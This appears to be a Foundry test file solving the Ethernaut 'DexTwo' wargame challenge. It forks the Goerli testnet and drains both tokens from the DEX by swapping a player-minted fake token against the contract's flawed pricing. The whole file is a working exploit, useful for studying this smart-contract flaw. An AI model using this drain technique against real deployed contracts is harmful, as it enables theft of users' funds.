// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/DexTwo.sol";
import "../src/SwappableTokenTwo.sol";

contract TestAttack is Test {

    string constant public PROJECT_ID = "PROJECT_ID";
    address payable public constant  DEX_ADDR = payable(0x1E1cD1a0Ec09c95D7Cb9Dd52b169F180d64c2E60);
    address payable public constant  PLAYER   = payable(0xCbB9660eA60B895443ef5001B968b6Ae4c0AaA18);

    DexTwo public dexCtr;
    SwappableTokenTwo public token1Ctr;
    SwappableTokenTwo public token2Ctr;
    SwappableTokenTwo public fakeCtr;

    function setUp() public {
        fork(9_229_075);

        dexCtr = (DexTwo)(DEX_ADDR);
        token1Ctr = (SwappableTokenTwo)(dexCtr.token1());
        token2Ctr = (SwappableTokenTwo)(dexCtr.token2());

        vm.prank(PLAYER);
        fakeCtr = new SwappableTokenTwo(DEX_ADDR, "FREE", "FREE", 100_000);
    }

    function fork(uint ublock) public {
        string memory infuraId = vm.envString(PROJECT_ID);
        console.log(PROJECT_ID, infuraId);

        string memory url = string.concat("https://goerli.infura.io/v3/", infuraId);
        console.log("URL", url);

        uint goerliFork = vm.createFork(url);
        vm.selectFork(goerliFork);
        vm.rollFork(ublock);
    }

    function testShow() public {
        uint token1Supply = token1Ctr.totalSupply();
        uint token2Supply = token2Ctr.totalSupply();
        uint token1Balance = token1Ctr.balanceOf(PLAYER);
        uint token2Balance = token2Ctr.balanceOf(PLAYER);
        uint swap12 = dexCtr.getSwapAmount(address(token1Ctr), address(token2Ctr), 100);
        uint swap21 = dexCtr.getSwapAmount(address(token2Ctr), address(token1Ctr), 100);

        console.log("Token1 Supply: ", token1Supply);
        console.log("Token2 Supply: ", token2Supply);
        console.log("Token1 Player: ", token1Balance);
        console.log("Token2 Player: ", token2Balance);
        console.log("Swap Rate - Token1:Token2, 100:", swap12);
        console.log("Swap Rate - Token2:Token1, 100:", swap21);

        // Given the getSwapAmount computation. 
        // To take all tokens out of the DEX we must give the DEX
        // x amount of fake tokens. Where x matches the amount being swapped.
        // We will swap one token so we give the DEX 1 fake token.
        vm.prank(PLAYER);
        fakeCtr.transfer(address(dexCtr), 1);

        //Note we approve 1 + 2 fake token transfer to prepare for 
        //second part of attack
        vm.prank(PLAYER);
        fakeCtr.approve(PLAYER, DEX_ADDR, 3);

        vm.prank(PLAYER);
        dexCtr.swap(address(fakeCtr), address(token1Ctr), 1);

        // Now the DEX has 2 fake tokens so we swap another 2 fake tokens
        // to empty the balance of token2
        vm.prank(PLAYER);
        dexCtr.swap(address(fakeCtr), address(token2Ctr), 2);

        token1Balance = token1Ctr.balanceOf(PLAYER);
        token2Balance = token2Ctr.balanceOf(PLAYER);
        console.log("Token1 Player: ", token1Balance);
        console.log("Token2 Player: ", token2Balance);
    }
}
